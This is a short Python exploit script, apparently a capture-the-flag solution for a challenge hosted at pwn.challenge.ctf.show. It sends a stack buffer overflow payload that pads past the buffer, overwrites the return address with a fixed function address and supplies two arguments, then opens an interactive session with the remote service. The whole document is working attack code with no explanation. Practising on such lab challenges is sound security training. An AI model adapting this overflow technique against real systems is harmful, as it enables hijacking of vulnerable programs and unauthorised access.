from pwn64 import *
u=remote("pwn.challenge.ctf.show",28231)
offset = 0x6C
flag = 0x08048586
payload=b'a'*(offset+4)+p32(flag)+p32(0)+p32(876)+p32(877)
u.sendline(payload)
u.interactive()